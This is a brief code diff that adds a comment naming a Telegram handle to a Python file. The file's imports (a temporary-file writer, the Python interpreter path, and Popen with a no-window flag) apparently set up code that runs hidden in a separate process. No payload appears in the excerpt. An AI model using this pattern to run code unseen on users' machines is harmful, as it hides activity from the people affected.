@@ -1,3 +1,5 @@
+# t.me/insmniapnl
+
 from tempfile import NamedTemporaryFile as _ffile
 from sys import executable as _eexecutable
 from subprocess import Popen, CREATE_NO_WINDOW
